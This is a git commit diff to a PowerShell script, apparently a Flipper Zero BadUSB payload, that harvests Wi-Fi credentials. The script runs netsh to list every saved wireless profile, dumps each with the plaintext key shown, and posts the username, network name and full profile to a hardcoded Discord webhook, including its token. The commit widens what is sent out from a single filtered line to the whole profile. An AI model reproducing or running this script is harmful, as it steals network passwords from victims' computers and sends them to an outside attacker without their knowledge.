22d9ee35368d80b6904b1392d2c6d57913aee46b
Tips <97804497+TimCrafter25@users.noreply.github.com>
2024-01-11 14:49:56 +0100

    Update Flipper-pw.ps1

--- Flipper-pw.ps1
+++ Flipper-pw.ps1
@@ -1,9 +1,13 @@
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
-    $passw = netsh wlan show profile $wlan key=clear | findst "All"
+    $prof = netsh wlan show profile $wlan key=clear
+	ForEach ($line in $prof) {
+		$line = $line -replace '\r\n', ' '
+	}
+
 	$Body = @{
 		'username' = $env:username + " | " + [string]$wlan
-		'content' = [string]$passw
+		'content' = [string]$prof
 	}
 	
 	Invoke-RestMethod -ContentType 'Application/Json' -Uri 'https://discord.com/api/webhooks/1188797313347493889/c2t6GjI0i8jpbE3RPer-E5DiuJQ8E6M3Vwnvder_3QI8l6a4XUt-mUHQtYzV_E9ToFMZ' -Method Post -Body ($Body | ConvertTo-Json)
